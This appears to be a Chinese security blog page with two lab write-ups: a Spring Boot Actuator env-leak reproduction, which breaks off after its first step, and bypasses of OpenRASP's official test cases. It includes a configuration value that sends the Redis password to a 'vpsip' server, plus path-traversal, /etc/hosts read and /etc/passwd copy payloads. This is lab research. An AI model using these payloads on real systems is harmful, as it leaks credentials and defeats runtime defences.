spring boot 漏洞复现

本文针对spring 的几个漏洞进行了复现
1.env信息泄漏

1、准备环境

git clone https://github.com/artsploit/actuator-testbed

运行程序

如果没运行起来看一下是不是spring默认端口8090和某飞机端口冲突了，如果冲突就手动修改为其他端口

此处改为8091后启动成功

2、env泄漏

在pom中添加redis支持

在application.properties中添加redis配置

更新pom后，访问http://127.0.0.1:8091/env

此时redis密码为*

修改spring.cloud.bootstrap.location属性为

spring.cloud.bootstrap.location=http://vpsip:6666/${spring.redis.password}

bypass-OpenRASP官方测试案例(缓慢更新)

Posted on 2020-04-13 Edited on 2020-07-28 In bypass

bypass-OpenRASP官方测试案例

本文用来记录OpenRASP官方测试样例的绕过

001 - 列目录操作 - scandir 方式

http://localhost/001-dir.php?dir=../../../../../../../../../../../etc

官方例子被拦截

简单测试发现只要出现..就会被拦截
所以绝对路径绕过

http://localhost/001-dir.php?dir=/var/www/html

002 - 任意文件读取 - file_get_contents


curl -g 'http://localhost/002-file-read.php?file=/etc/hosts'
官方例子被拦截

绝对路径加上相对路径绕过
http://localhost/002-file-read.php?file=/./etc/hosts

004 - 命令执行 - exec 方式，无回显

curl -g 'http://localhost/004-command-1.php?cmd=cp+/etc/passwd+/tmp/'

官方例子被拦截

缓慢更新。。。。
